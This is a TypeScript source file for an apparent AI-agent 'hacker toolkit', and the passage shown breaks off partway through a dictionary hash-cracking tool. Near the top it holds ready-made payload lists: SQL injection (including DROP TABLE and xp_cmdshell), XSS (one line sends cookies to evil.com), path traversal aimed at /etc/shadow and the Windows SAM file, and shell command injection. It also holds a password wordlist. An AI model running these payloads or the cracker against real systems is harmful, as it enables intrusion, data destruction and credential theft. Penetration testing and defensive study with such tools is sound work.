// kbot Hacker Toolkit — 20 offensive/defensive security tools
// Hash cracking, encoding, DNS enum, fuzzing, CORS checks, JWT analysis,
// steganography, forensics, crypto utilities, payload generation, and more.
// All tools use Node.js built-in modules + global fetch. No external deps.

import { registerTool } from './index.js'
import {
  createHash,
  createHmac,
  randomBytes,
  createCipheriv,
  createDecipheriv,
  pbkdf2Sync,
  scryptSync,
} from 'node:crypto'
import { execSync } from 'node:child_process'
import { Resolver } from 'node:dns/promises'
import { homedir } from 'node:os'
import { join } from 'node:path'
import { readFileSync, writeFileSync, existsSync, mkdirSync, statSync } from 'node:fs'
import { connect as tlsConnect } from 'node:tls'

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// Common wordlists, payloads, and constants
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

const COMMON_PASSWORDS = [
  'password', '123456', '12345678', '1234', 'qwerty', '12345', 'dragon', 'pussy',
  'baseball', 'football', 'letmein', 'monkey', '696969', 'abc123', 'mustang',
  'michael', 'shadow', 'master', 'jennifer', '111111', '2000', 'jordan',
  'superman', 'harley', '1234567', 'fuckme', 'hunter', 'fuckyou', 'trustno1',
  'ranger', 'buster', 'thomas', 'tigger', 'robert', 'soccer', 'fuck',
  'batman', 'test', 'pass', 'killer', 'hockey', 'george', 'charlie',
  'andrew', 'michelle', 'love', 'sunshine', 'jessica', 'asshole', '6969',
  'pepper', 'daniel', 'access', '123456789', '654321', 'joshua', 'maggie',
  'starwars', 'silver', 'william', 'dallas', 'yankees', '123123', 'ashley',
  '666666', 'hello', 'amanda', 'orange', 'biteme', 'freedom', 'computer',
  'sexy', 'thunder', 'nicole', 'ginger', 'heather', 'hammer', 'summer',
  'corvette', 'taylor', 'fucker', 'austin', '1111', 'merlin', 'matthew',
  '121212', 'golfer', 'cheese', 'princess', 'martin', 'chelsea', 'patrick',
  'richard', 'diamond', 'yellow', 'bigdog', 'secret', 'asdfgh', 'sparky',
  'cowboy', 'camaro', 'anthony', 'matrix', 'falcon', 'iloveyou', 'bailey',
  'guitar', 'jackson', 'purple', 'scooter', 'phoenix', 'aaaaaa', 'morgan',
  'tigers', 'porsche', 'mickey', 'maverick', 'cookie', 'nascar', 'peanut',
  'justin', '131313', 'money', 'horny', 'samantha', 'panties', 'steelers',
  'joseph', 'snoopy', 'boomer', 'whatever', 'iceman', 'smokey', 'gateway',
  'dakota', 'cowboys', 'eagles', 'chicken', 'dick', 'black', 'zxcvbn',
  'please', 'andrea', 'ferrari', 'knight', 'hardcore', 'melissa', 'compaq',
  'coffee', 'booboo', 'bitch', 'johnny', 'bulldog', 'xxxxxx', 'welcome',
  'james', 'player', 'ncc1701', 'wizard', 'scooby', 'charles', 'junior',
  'internet', 'mike', 'brandy', 'tennis', 'blowjob', 'banana', 'monster',
  'spider', 'lakers', 'miller', 'rabbit', 'enter', 'mercedes', 'brandon',
  'steven', 'fender', 'john', 'yamaha', 'diablo', 'chris', 'boston',
  'tiger', 'marine', 'chicago', 'rangers', 'gandalf', 'winter', 'bigtits',
  'barney', 'edward', 'raiders', 'porn', 'badboy', 'blowme', 'spanky',
  'bigdaddy', 'johnson', 'chester', 'london', 'midnight', 'blue', 'fishing',
  '000000', 'hannah', 'slayer', '11111111', 'rachel', 'redsox', 'thx1138',
  'asdf', 'panther', 'rebecca', 'happy', 'apache', 'joshua1', 'golden',
  'abcdef', 'sniper', 'simpsons', 'legend', 'captain', 'murphy', 'lovers',
  'jasmine', 'jennifer1', 'nicholas', 'beavis', 'nathan', 'victor',
  'florida', 'genesis', 'warriors', 'samsung', 'viking', 'butthead',
  'asdfasdf', 'password1', 'password123', 'admin', 'admin123', 'root',
  'toor', 'pass123', 'qwerty123', 'letmein1', 'welcome1', 'monkey123',
  'login', 'princess1', 'abc1234', 'changeme', 'trustno1', '000000',
  '1q2w3e4r', '1qaz2wsx', 'zaq1xsw2', 'qazwsx', 'passw0rd', 'p@ssw0rd',
  'p@ssword', 'P@ssw0rd', 'P@ssword1', 'Pa$$w0rd', 'admin1', 'administrator',
  'nimda', 'letmein!', 'welcome!', 'qwert', 'asdfghjkl', 'zxcvbnm',
  '1234567890', 'q1w2e3r4', 'q1w2e3r4t5', 'iloveu', 'lovely', 'sunshine1',
  'shadow1', 'master1', '12345a', '123abc', 'aaa111', '1a2b3c', 'qwer1234',
  'test123', 'test1', 'testing', 'guest', 'default', 'public',
  'private', 'secure', 'security', 'server', 'system', 'service',
  'oracle', 'mysql', 'postgres', 'database', 'backup', 'temp',
  'temp123', 'user', 'user123', 'demo', 'demo123', 'sample',
  'example', 'tomcat', 'manager', 'webmaster', 'operator', 'supervisor',
  'monitor', 'control', 'support', 'helpdesk', 'qwerty1', 'password2',
  'password!', 'pa55word', 'pass1234', 'p455w0rd', 'football1', 'baseball1',
  'soccer1', 'hockey1', 'golf', 'boxing', 'tennis1', 'swimming',
  'running', 'cycling', 'gaming', 'music', 'movies', 'travel',
  'love123', 'baby', 'angel', 'angel1', 'hottie', 'sexy1',
  'lovely1', 'cutie', 'sweety', 'honey', 'sugar', 'cookie1',
  'forever', 'friends', 'family', 'batman1', 'superman1', 'spiderman',
  'ironman', 'wolverine', 'hulk', 'thor', 'captain1', 'deadpool',
  'joker', 'harleyquinn', 'pokemon', 'pikachu', 'mario', 'zelda',
  'naruto', 'goku', 'spongebob', 'minecraft', 'fortnite', 'roblox',
  'apple', 'google', 'facebook', 'twitter', 'amazon', 'microsoft',
  'samsung1', 'iphone', 'android', 'linux', 'windows', 'ubuntu',
  'hacker', 'hacking', 'pentester', 'exploit', 'backdoor', 'malware',
  'virus', 'trojan', 'worm', 'rootkit', 'keylogger', 'phishing',
  'spring', 'summer1', 'autumn', 'fall', 'winter1', 'snow',
  'rain', 'storm', 'thunder1', 'lightning', 'tornado', 'hurricane',
  'january', 'february', 'march', 'april', 'may', 'june',
  'july', 'august', 'september', 'october', 'november', 'december',
  'monday', 'tuesday', 'wednesday', 'thursday', 'friday', 'saturday', 'sunday',
  'red', 'blue1', 'green', 'yellow1', 'purple1', 'orange1',
  'black1', 'white', 'pink', 'brown', 'gold', 'silver1',
  'newyork', 'losangeles', 'chicago1', 'houston', 'phoenix1', 'dallas1',
  'london1', 'paris', 'tokyo', 'berlin', 'moscow', 'sydney',
  'canada', 'america', 'england', 'france', 'germany', 'japan',
  'brazil', 'india', 'china', 'russia', 'australia', 'mexico',
  'abc12345', 'abc1234', '12341234', '11223344', 'aabbccdd', 'password12',
  'letmein123', 'changeme1', 'changeme!', 'qwerty!', 'admin!',
]

const NUMERIC_WORDLIST = Array.from({ length: 10000 }, (_, i) => String(i).padStart(4, '0'))

const SQLI_PAYLOADS = [
  "' OR 1=1--",
  "\" OR 1=1--",
  "' OR '1'='1",
  "' OR '1'='1'--",
  "' OR '1'='1'/*",
  "' OR 1=1#",
  "' UNION SELECT NULL--",
  "' UNION SELECT NULL, NULL--",
  "' UNION SELECT NULL, NULL, NULL--",
  "1' AND '1'='1",
  "1' AND '1'='2",
  "' AND 1=1--",
  "' AND 1=2--",
  "admin'--",
  "admin' #",
  "admin'/*",
  "' OR 1=1 LIMIT 1--",
  "1'; DROP TABLE users--",
  "'; EXEC xp_cmdshell('whoami')--",
  "' UNION SELECT username, password FROM users--",
  "' OR EXISTS(SELECT * FROM users WHERE username='admin')--",
  "' HAVING 1=1--",
  "' GROUP BY columnnames HAVING 1=1--",
  "' ORDER BY 1--",
  "' ORDER BY 100--",
  "1 OR 1=1",
  "1' OR '1'='1",
  "') OR ('1'='1",
  "')) OR (('1'='1",
  "' WAITFOR DELAY '0:0:5'--",
  "'; SELECT SLEEP(5)--",
  "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
  "' UNION ALL SELECT NULL--",
  "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
  "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)--",
]

const XSS_PAYLOADS = [
  '<script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  '<svg onload=alert(1)>',
  '<body onload=alert(1)>',
  '<input onfocus=alert(1) autofocus>',
  '<marquee onstart=alert(1)>',
  '<details open ontoggle=alert(1)>',
  '<video src=x onerror=alert(1)>',
  '<audio src=x onerror=alert(1)>',
  'javascript:alert(1)',
  '<a href="javascript:alert(1)">click</a>',
  '" onfocus="alert(1)" autofocus="',
  "' onfocus='alert(1)' autofocus='",
  '<div style="background:url(javascript:alert(1))">',
  '<iframe src="javascript:alert(1)">',
  '<object data="javascript:alert(1)">',
  '<embed src="javascript:alert(1)">',
  '"><script>alert(1)</script>',
  "'><script>alert(1)</script>",
  '</script><script>alert(1)</script>',
  '<img src=1 onerror=alert(document.cookie)>',
  '<svg/onload=alert(1)>',
  '<img src=x onerror=prompt(1)>',
  '<img src=x onerror=confirm(1)>',
  '{{constructor.constructor("alert(1)")()}}',
  '${alert(1)}',
  '<script>fetch("https://evil.com/steal?c="+document.cookie)</script>',
  '<img src=x onerror="eval(atob(\'YWxlcnQoMSk=\'))">',
  '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>',
  '<form><button formaction=javascript:alert(1)>X</button></form>',
  '<isindex action=javascript:alert(1) type=image>',
  '"><img src=x onerror=alert(String.fromCharCode(88,83,83))>',
]

const TRAVERSAL_PAYLOADS = [
  '../etc/passwd',
  '../../etc/passwd',
  '../../../etc/passwd',
  '../../../../etc/passwd',
  '../../../../../etc/passwd',
  '..\\windows\\system32\\drivers\\etc\\hosts',
  '..\\..\\windows\\system32\\drivers\\etc\\hosts',
  '....//etc/passwd',
  '....//....//etc/passwd',
  '..%2f..%2f..%2fetc%2fpasswd',
  '..%252f..%252f..%252fetc%252fpasswd',
  '%2e%2e%2f%2e%2e%2fetc%2fpasswd',
  '%2e%2e/%2e%2e/etc/passwd',
  '..%c0%af..%c0%afetc%c0%afpasswd',
  '..%c1%9c..%c1%9cetc%c1%9cpasswd',
  '/etc/passwd',
  '/etc/shadow',
  '/etc/hosts',
  '/proc/self/environ',
  '/proc/version',
  'C:\\boot.ini',
  'C:\\windows\\system32\\config\\sam',
  '....\\....\\....\\etc\\passwd',
  '..;/etc/passwd',
  '..%00/etc/passwd',
]

const COMMAND_PAYLOADS = [
  '; ls',
  '| ls',
  '`ls`',
  '$(ls)',
  '; cat /etc/passwd',
  '| cat /etc/passwd',
  '`cat /etc/passwd`',
  '$(cat /etc/passwd)',
  '; whoami',
  '| whoami',
  '`whoami`',
  '$(whoami)',
  '; id',
  '| id',
  '`id`',
  '$(id)',
  '; uname -a',
  '| uname -a',
  '; ping -c 4 127.0.0.1',
  '| ping -c 4 127.0.0.1',
  '& ping -c 4 127.0.0.1',
  '\n/bin/ls',
  '\nid',
  '${IFS}id',
  ';${IFS}id',
  '{ls,/}',
  "'; ls #",
  '"; ls #',
  '| sleep 5',
  '; sleep 5',
  '`sleep 5`',
  '$(sleep 5)',
]

const COMMON_SUBDOMAINS_SMALL = [
  'www', 'mail', 'ftp', 'localhost', 'webmail', 'smtp', 'pop', 'ns1', 'ns2',
  'webdisk', 'admin', 'api', 'dev', 'staging', 'test', 'blog', 'shop', 'app',
  'cdn', 'cloud', 'cpanel', 'direct', 'email', 'exchange', 'forum', 'help',
  'imap', 'info', 'intranet', 'login', 'm', 'media', 'mobile', 'mx', 'mysql',
  'new', 'news', 'old', 'panel', 'portal', 'preview', 'proxy', 'remote',
  'search', 'secure', 'server', 'ssh', 'ssl', 'status', 'store', 'support',
  'vpn', 'web', 'wiki', 'www2', 'beta', 'alpha', 'demo', 'docs', 'git',
  'gitlab', 'jenkins', 'jira', 'confluence', 'grafana', 'kibana', 'prometheus',
  'monitor', 'sentry', 'analytics', 'dashboard', 'assets', 'static', 'img',
  'images', 'video', 'download', 'uploads', 'files', 'data', 'backup',
  'stage', 'preprod', 'prod', 'production', 'development', 'sandbox', 'uat',
  'qa', 'testing', 'internal', 'private', 'public', 'gateway', 'lb',
  'load', 'node1', 'node2', 'db', 'redis', 'cache', 'queue', 'worker',
  'cron', 'scheduler', 'auth', 'sso', 'oauth', 'id', 'accounts',
]

const COMMON_SUBDOMAINS_MEDIUM = [
  ...COMMON_SUBDOMAINS_SMALL,
  'autodiscover', 'autoconfig', 'mailgw', 'mx1', 'mx2', 'ns3', 'ns4',
  'dns', 'dns1', 'dns2', 'relay', 'smtp1', 'smtp2', 'pop3', 'imap4',
  'webmail2', 'mail2', 'owa', 'outlook', 'calendar', 'contact',
  'directory', 'ldap', 'radius', 'wpad', 'time', 'ntp',
  'log', 'logs', 'syslog', 'splunk', 'elastic', 'logstash',
  'vault', 'consul', 'nomad', 'terraform', 'ansible', 'puppet', 'chef',
  'docker', 'k8s', 'kubernetes', 'rancher', 'swarm', 'mesos',
  'ci', 'cd', 'build', 'deploy', 'release', 'artifact', 'nexus',
  'sonar', 'sonarqube', 'codecov', 'coverage', 'lint', 'scan',
  'api2', 'api3', 'graphql', 'rest', 'rpc', 'grpc', 'ws', 'wss',
  'socket', 'websocket', 'stream', 'feed', 'notify', 'push',
  'signup', 'register', 'verify', 'confirm', 'reset', 'recover',
  'billing', 'payment', 'invoice', 'subscription', 'checkout', 'cart',
  'www1', 'www3', 'web1', 'web2', 'site', 'home', 'landing',
  'cms', 'wordpress', 'wp', 'drupal', 'joomla', 'typo3', 'magento',
  'crm', 'erp', 'hr', 'payroll', 'inventory', 'order', 'shipping',
  'partner', 'affiliate', 'reseller', 'vendor', 'supplier', 'client',
  'dev1', 'dev2', 'test1', 'test2', 'stage1', 'stage2', 'uat1', 'uat2',
  'origin', 'edge', 'cdn1', 'cdn2', 'static1', 'static2',
  'ns5', 'ns6', 'mx3', 'mx4', 'mail3', 'mail4',
  'reports', 'reporting', 'bi', 'tableau', 'metabase', 'redash',
  'chat', 'slack', 'teams', 'meet', 'zoom', 'video1',
  'vpn1', 'vpn2', 'openvpn', 'wireguard', 'ipsec', 'tunnel',
  'firewall', 'waf', 'ids', 'ips', 'nids', 'hids',
  'repo', 'repository', 'svn', 'hg', 'mercurial', 'cvs',
  'pkg', 'packages', 'npm', 'pypi', 'gem', 'maven',
  'go', 'golang', 'rust', 'python', 'ruby', 'java', 'php',
  'v1', 'v2', 'v3', 'legacy', 'classic', 'next', 'canary',
  'health', 'healthcheck', 'ping', 'alive', 'ready', 'live',
  'metrics', 'trace', 'tracing', 'jaeger', 'zipkin', 'datadog',
  'aws', 'azure', 'gcp', 'gcloud', 'do', 'linode', 'vultr',
  'service', 'services', 'microservice', 'function', 'lambda', 'faas',
]

const COMMON_SUBDOMAINS_LARGE = [
  ...COMMON_SUBDOMAINS_MEDIUM,
  ...Array.from({ length: 50 }, (_, i) => `server${i + 1}`),
  ...Array.from({ length: 50 }, (_, i) => `host${i + 1}`),
  ...Array.from({ length: 30 }, (_, i) => `node${i + 1}`),
  ...Array.from({ length: 30 }, (_, i) => `web${i + 1}`),
  ...Array.from({ length: 20 }, (_, i) => `app${i + 1}`),
  ...Array.from({ length: 20 }, (_, i) => `db${i + 1}`),
  ...Array.from({ length: 20 }, (_, i) => `cache${i + 1}`),
  ...Array.from({ length: 20 }, (_, i) => `worker${i + 1}`),
  ...Array.from({ length: 10 }, (_, i) => `proxy${i + 1}`),
  ...Array.from({ length: 10 }, (_, i) => `lb${i + 1}`),
  ...Array.from({ length: 10 }, (_, i) => `vpn${i + 1}`),
  ...Array.from({ length: 10 }, (_, i) => `ns${i + 1}`),
  ...Array.from({ length: 10 }, (_, i) => `mx${i + 1}`),
  ...Array.from({ length: 10 }, (_, i) => `mail${i + 1}`),
  'admin1', 'admin2', 'panel1', 'panel2', 'cp', 'cpanel2',
  'whm', 'plesk', 'ispconfig', 'webmin', 'cockpit', 'portainer',
  'pgadmin', 'phpmyadmin', 'adminer', 'dbeaver', 'mongo', 'mongodb',
  'couchdb', 'cassandra', 'neo4j', 'influxdb', 'timescaledb', 'clickhouse',
  'rabbitmq', 'kafka', 'nats', 'pulsar', 'activemq', 'zeromq',
  'nginx', 'apache', 'httpd', 'caddy', 'traefik', 'haproxy', 'envoy',
  'gitea', 'gogs', 'bitbucket', 'azure-devops', 'circleci', 'travis',
  'drone', 'concourse', 'argo', 'argocd', 'flux', 'spinnaker',
  'harbor', 'registry', 'gcr', 'ecr', 'acr', 'quay',
  'istio', 'linkerd', 'kong', 'ambassador', 'apisix', 'tyk',
  'keycloak', 'okta', 'auth0', 'hydra', 'dex', 'cas',
  'minio', 's3', 'storage', 'blob', 'bucket', 'object',
  'smtp3', 'imap2', 'pop2', 'postfix', 'dovecot', 'exim',
  'roundcube', 'rainloop', 'horde', 'zimbra', 'mailu',
  'netbox', 'phpipam', 'racktables', 'napalm', 'oxidized',
  'icinga', 'nagios', 'zabbix', 'checkmk', 'prtg', 'uptime',
  'uptimerobot', 'statuscake', 'pingdom', 'newrelic', 'appdynamics',
]

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// Helper utilities
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

function identifyHashType(hash: string): string[] {
  const types: string[] = []
  const h = hash.trim()

  if (/^\$2[aby]\$\d{2}\$.{53}$/.test(h)) types.push('bcrypt')
  if (/^\$argon2(id?|d)\$/.test(h)) types.push('argon2')
  if (/^\$5\$/.test(h)) types.push('SHA-256-crypt')
  if (/^\$6\$/.test(h)) types.push('SHA-512-crypt')
  if (/^\$1\$/.test(h)) types.push('MD5-crypt')
  if (/^\$apr1\$/.test(h)) types.push('Apache-MD5')
  if (/^[a-f0-9]{32}$/i.test(h)) types.push('MD5', 'NTLM')
  if (/^[a-f0-9]{40}$/i.test(h)) types.push('SHA-1', 'MySQL5')
  if (/^[a-f0-9]{56}$/i.test(h)) types.push('SHA-224', 'SHA3-224')
  if (/^[a-f0-9]{64}$/i.test(h)) types.push('SHA-256', 'SHA3-256')
  if (/^[a-f0-9]{96}$/i.test(h)) types.push('SHA-384', 'SHA3-384')
  if (/^[a-f0-9]{128}$/i.test(h)) types.push('SHA-512', 'SHA3-512', 'Whirlpool')
  if (/^[a-f0-9]{8}$/i.test(h)) types.push('CRC32', 'Adler32')
  if (/^[a-f0-9]{16}$/i.test(h)) types.push('MySQL3', 'DES', 'Half-MD5')
  if (/^\{SHA\}/.test(h)) types.push('LDAP-SHA')
  if (/^\{SSHA\}/.test(h)) types.push('LDAP-SSHA')
  if (/^\{MD5\}/.test(h)) types.push('LDAP-MD5')

  if (types.length === 0) types.push('Unknown')
  return types
}

function hashWith(algorithm: string, data: string): string {
  return createHash(algorithm).update(data).digest('hex')
}

function base64UrlDecode(str: string): string {
  const padded = str.replace(/-/g, '+').replace(/_/g, '/') +
    '='.repeat((4 - (str.length % 4)) % 4)
  return Buffer.from(padded, 'base64').toString('utf-8')
}

function base64UrlEncode(data: string): string {
  return Buffer.from(data).toString('base64')
    .replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '')
}

function calculateEntropy(data: Buffer): number {
  const freq = new Map<number, number>()
  for (const byte of data) {
    freq.set(byte, (freq.get(byte) || 0) + 1)
  }
  let entropy = 0
  const len = data.length
  for (const count of freq.values()) {
    const p = count / len
    if (p > 0) entropy -= p * Math.log2(p)
  }
  return entropy
}

function calculatePasswordEntropy(password: string): number {
  let charsetSize = 0
  if (/[a-z]/.test(password)) charsetSize += 26
  if (/[A-Z]/.test(password)) charsetSize += 26
  if (/[0-9]/.test(password)) charsetSize += 10
  if (/[^a-zA-Z0-9]/.test(password)) charsetSize += 33
  if (charsetSize === 0) return 0
  return password.length * Math.log2(charsetSize)
}

function estimateCrackTime(entropy: number): string {
  // Assume 10 billion guesses per second (modern GPU cluster)
  const guessesPerSecond = 10_000_000_000
  const totalGuesses = Math.pow(2, entropy)
  const seconds = totalGuesses / guessesPerSecond / 2 // average case

  if (seconds < 0.001) return 'instant'
  if (seconds < 1) return `${(seconds * 1000).toFixed(0)} milliseconds`
  if (seconds < 60) return `${seconds.toFixed(1)} seconds`
  if (seconds < 3600) return `${(seconds / 60).toFixed(1)} minutes`
  if (seconds < 86400) return `${(seconds / 3600).toFixed(1)} hours`
  if (seconds < 31536000) return `${(seconds / 86400).toFixed(1)} days`
  if (seconds < 31536000 * 100) return `${(seconds / 31536000).toFixed(1)} years`
  if (seconds < 31536000 * 1_000_000) return `${(seconds / 31536000).toFixed(0)} years`
  return `${(seconds / 31536000).toExponential(2)} years`
}

function rot13(str: string): string {
  return str.replace(/[a-zA-Z]/g, (c) => {
    const base = c <= 'Z' ? 65 : 97
    return String.fromCharCode(((c.charCodeAt(0) - base + 13) % 26) + base)
  })
}

function ascii85Encode(data: Buffer): string {
  const result: string[] = ['<~']
  for (let i = 0; i < data.length; i += 4) {
    let value = 0
    const remaining = Math.min(4, data.length - i)
    for (let j = 0; j < 4; j++) {
      value = (value * 256) + (j < remaining ? data[i + j] : 0)
    }
    if (value === 0 && remaining === 4) {
      result.push('z')
    } else {
      const chars: string[] = []
      for (let j = 4; j >= 0; j--) {
        chars[j] = String.fromCharCode((value % 85) + 33)
        value = Math.floor(value / 85)
      }
      result.push(chars.slice(0, remaining + 1).join(''))
    }
  }
  result.push('~>')
  return result.join('')
}

function ascii85Decode(data: string): string {
  const stripped = data.replace(/^<~/, '').replace(/~>$/, '').replace(/\s/g, '')
  const result: number[] = []
  let i = 0
  while (i < stripped.length) {
    if (stripped[i] === 'z') {
      result.push(0, 0, 0, 0)
      i++
      continue
    }
    let value = 0
    const groupLen = Math.min(5, stripped.length - i)
    for (let j = 0; j < 5; j++) {
      const c = j < groupLen ? stripped.charCodeAt(i + j) - 33 : 84
      value = value * 85 + c
    }
    for (let j = 3; j >= 0; j--) {
      if (j < groupLen - 1) {
        result.push((value >> (j * 8)) & 0xFF)
      }
    }
    i += groupLen
  }
  return Buffer.from(result).toString('utf-8')
}

async function fetchWithTimeout(url: string, options: RequestInit = {}, timeoutMs = 10000): Promise<Response> {
  const controller = new AbortController()
  const timer = setTimeout(() => controller.abort(), timeoutMs)
  try {
    const resp = await fetch(url, { ...options, signal: controller.signal })
    return resp
  } finally {
    clearTimeout(timer)
  }
}

const FILE_SIGNATURES: [number[], string][] = [
  [[0x89, 0x50, 0x4E, 0x47], 'PNG image'],
  [[0xFF, 0xD8, 0xFF], 'JPEG image'],
  [[0x47, 0x49, 0x46, 0x38], 'GIF image'],
  [[0x42, 0x4D], 'BMP image'],
  [[0x25, 0x50, 0x44, 0x46], 'PDF document'],
  [[0x50, 0x4B, 0x03, 0x04], 'ZIP archive (or DOCX/XLSX/JAR/APK)'],
  [[0x50, 0x4B, 0x05, 0x06], 'ZIP archive (empty)'],
  [[0x1F, 0x8B], 'GZIP compressed'],
  [[0x42, 0x5A, 0x68], 'BZIP2 compressed'],
  [[0xFD, 0x37, 0x7A, 0x58, 0x5A], 'XZ compressed'],
  [[0x52, 0x61, 0x72, 0x21], 'RAR archive'],
  [[0x37, 0x7A, 0xBC, 0xAF], '7-Zip archive'],
  [[0x7F, 0x45, 0x4C, 0x46], 'ELF executable (Linux/Unix)'],
  [[0x4D, 0x5A], 'PE executable (Windows .exe/.dll)'],
  [[0xCE, 0xFA, 0xED, 0xFE], 'Mach-O binary (32-bit, macOS)'],
  [[0xCF, 0xFA, 0xED, 0xFE], 'Mach-O binary (64-bit, macOS)'],
  [[0xCA, 0xFE, 0xBA, 0xBE], 'Java class file or Mach-O universal binary'],
  [[0x00, 0x00, 0x00, 0x1C, 0x66, 0x74, 0x79, 0x70], 'MP4 video'],
  [[0x00, 0x00, 0x00, 0x20, 0x66, 0x74, 0x79, 0x70], 'MP4 video'],
  [[0x1A, 0x45, 0xDF, 0xA3], 'WebM/MKV video'],
  [[0x49, 0x44, 0x33], 'MP3 audio (ID3 tag)'],
  [[0xFF, 0xFB], 'MP3 audio'],
  [[0xFF, 0xF3], 'MP3 audio'],
  [[0x66, 0x4C, 0x61, 0x43], 'FLAC audio'],
  [[0x4F, 0x67, 0x67, 0x53], 'OGG audio/video'],
  [[0x52, 0x49, 0x46, 0x46], 'RIFF container (WAV/AVI/WebP)'],
  [[0x53, 0x51, 0x4C, 0x69, 0x74, 0x65], 'SQLite database'],
  [[0x00, 0x61, 0x73, 0x6D], 'WebAssembly binary'],
  [[0xD0, 0xCF, 0x11, 0xE0], 'Microsoft Office (legacy .doc/.xls/.ppt)'],
  [[0x49, 0x49, 0x2A, 0x00], 'TIFF image (little-endian)'],
  [[0x4D, 0x4D, 0x00, 0x2A], 'TIFF image (big-endian)'],
  [[0x23, 0x21], 'Script (shebang #!)'],
  [[0xEF, 0xBB, 0xBF], 'UTF-8 BOM text'],
  [[0xFF, 0xFE], 'UTF-16 LE BOM text'],
  [[0xFE, 0xFF], 'UTF-16 BE BOM text'],
]

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// Tool registration
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

export function registerHackerToolkitTools(): void {

  // ─────────────────────────────────────────────────────────────────────────────
  // 1. hash_crack — Identify and test hashes
  // ─────────────────────────────────────────────────────────────────────────────

  registerTool({
    name: 'hash_crack',
    description: 'Identify hash type and attempt dictionary crack. Supports MD5, SHA-1, SHA-256, SHA-512, bcrypt, and more. Built-in wordlist of 500+ common passwords. Returns hash type, result, plaintext if cracked, and time taken.',
    parameters: {
      hash: { type: 'string', description: 'The hash to analyze and attempt to crack', required: true },
      wordlist: { type: 'string', description: 'Wordlist to use: "common" (500+), "rockyou_top1000", "numeric" (0000-9999), "custom"', default: 'common' },
      custom_words: { type: 'string', description: 'Comma-separated custom wordlist (when wordlist="custom")' },
    },
    tier: 'free',
    timeout: 120_000,
    async execute(args) {
      const hash = String(args.hash).trim()
      const wordlistType = String(args.wordlist || 'common')
      const startTime = Date.now()

      // Identify hash type
      const hashTypes = identifyHashType(hash)
      const lines: string[] = [
        '## Hash Analysis',
        '',
        `**Input**: \`${hash}\``,
        `**Length**: ${hash.length} characters`,
        `**Identified types**: ${hashTypes.join(', ')}`,
        '',
      ]

      // Skip cracking for bcrypt/argon2 (too slow for dictionary attack in Node)
      if (hashTypes.some(t => ['bcrypt', 'argon2', 'SHA-256-crypt', 'SHA-512-crypt'].includes(t))) {
        lines.push('**Note**: This hash type uses key stretching (bcrypt/argon2/crypt). Dictionary attack would be extremely slow.')
        lines.push('Recommend using dedicated GPU cracking tools (hashcat, john) for these hash types.')
        lines.push('')
        lines.push(`**Time**: ${Date.now() - startTime}ms`)
        return lines.join('\n')
      }

      // Build wordlist
      let words: string[] = []
      switch (wordlistType) {
        case 'common':
        case 'rockyou_top1000':
          words = [...COMMON_PASSWORDS]
          // Add common variations
          const variations: string[] = []
          for (const w of COMMON_PASSWORDS.slice(0, 200)) {
            variations.push(w + '1', w + '!', w + '123', w.toUpperCase(), w.charAt(0).toUpperCase() + w.slice(1))
          }
          words.push(...variations)
          break
        case 'numeric':
          words = [...NUMERIC_WORDLIST]
          break
        case 'custom':
          words = String(args.custom_words || '').split(',').map(w => w.trim()).filter(Boolean)
          break
        default:
          words = [...COMMON_PASSWORDS]
      }

      lines.push(`**Wordlist**: ${wordlistType} (${words.length} words)`)
      lines.push('')

      // Determine which hash algorithms to try
      const algorithmsToTry: { name: string; algo: string }[] = []
      for (const t of hashTypes) {
        if (t === 'MD5' || t === 'NTLM') algorithmsToTry.push({ name: 'MD5', algo: 'md5' })
        if (t === 'SHA-1' || t === 'MySQL5') algorithmsToTry.push({ name: 'SHA-1', algo: 'sha1' })
        if (t === 'SHA-224') algorithmsToTry.push({ name: 'SHA-224', algo: 'sha224' })
        if (t === 'SHA-256' || t === 'SHA3-256') {
          algorithmsToTry.push({ name: 'SHA-256', algo: 'sha256' })
        }
        if (t === 'SHA-384') algorithmsToTry.push({ name: 'SHA-384', algo: 'sha384' })
        if (t === 'SHA-512' || t === 'SHA3-512') {
          algorithmsToTry.push({ name: 'SHA-512', algo: 'sha512' })
        }
      }

      // Deduplicate
      const seen = new Set<string>()
      const uniqueAlgos = algorithmsToTry.filter(a => {
        if (seen.has(a.algo)) return false
        seen.add(a.algo)
        return true
      })

      if (uniqueAlgos.length === 0) {
        lines.push('**Result**: Cannot attempt crack for this hash type (unsupported algorithm or key-stretched)')
        lines.push(`**Time**: ${Date.now() - startTime}ms`)
        return lines.join('\n')
      }

      // Attempt crack
      let cracked = false
      let crackedPlaintext = ''
      let crackedAlgo = ''
      let attempts = 0

      for (const { name, algo } of uniqueAlgos) {
        if (cracked) break
        for (const word of words) {
          attempts++
          const computed = hashWith(algo, word)
          if (computed.toLowerCase() === hash.toLowerCase()) {
            cracked = true
            crackedPlaintext = word
            crackedAlgo = name
            break
          }
        }
      }

      const elapsed = Date.now() - startTime
      const rate = Math.round(attempts / (elapsed / 1000))

      if (cracked) {
        lines.push(`### CRACKED`)
        lines.push('')
        lines.push(`| Field | Value |`)
        lines.push(`|-------|-------|`)
        lines.push(`| Plaintext | \`${crackedPlaintext}\` |`)
        lines.push(`| Algorithm | ${crackedAlgo} |`)
        lines.push(`| Attempts | ${attempts.toLocaleString()} |`)
        lines.push(`| Speed | ${rate.toLocaleString()} hashes/sec |`)
        lines.push(`| Time | ${elapsed}ms |`)
        lines.push('')
